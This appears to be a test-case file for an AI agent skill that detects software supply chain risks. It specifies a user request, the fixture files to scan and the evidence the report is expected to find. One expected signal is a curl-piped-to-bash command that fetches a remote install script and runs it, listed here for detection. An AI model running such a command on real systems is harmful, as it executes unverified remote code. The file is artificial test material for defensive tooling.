# Positive case: detect-supply-chain-risks

Expected result: invoke `detect-supply-chain-risks`.

User request:

```text
/detect-supply-chain-risks D:\Download\CascadeProjects\secureaiskills\test-projects\skill-fixture

Run the detect-supply-chain-risks workflow against the fixture project and generate a Markdown report at D:\Download\CascadeProjects\secureaiskills\test-projects\skill-positive-negative-cases\detect-supply-chain-risks\report.md. The report must include rule IDs, evidence paths, severity, remediation, and a no-findings section when applicable.
```

Why this is positive:

- Skill description: Detects software supply chain risks across repositories, dependency manifests, package registries, CI/CD workflows, container references, release artifacts, build scripts, and provenance evidence. Use when reviewing dependency confusion, typosquatting, unpinned GitHub Actions, mutable image tags, unsigned artifacts, missing SBOM/provenance, unsafe package install scripts, weak CI permissions, registry trust, or software/data integrity failures.
- Uses the explicit trigger `/detect-supply-chain-risks`.
- Points at known fixture evidence for this skill.

Fixture targets:
- .github/workflows/build.yml
- Dockerfile
- package.json

Expected evidence signals:
- pull_request_target
- curl -s https://example.invalid/install.sh | bash
- postinstall

Expected report output:

- D:\Download\CascadeProjects\secureaiskills\test-projects\skill-positive-negative-cases\detect-supply-chain-risks\report.md

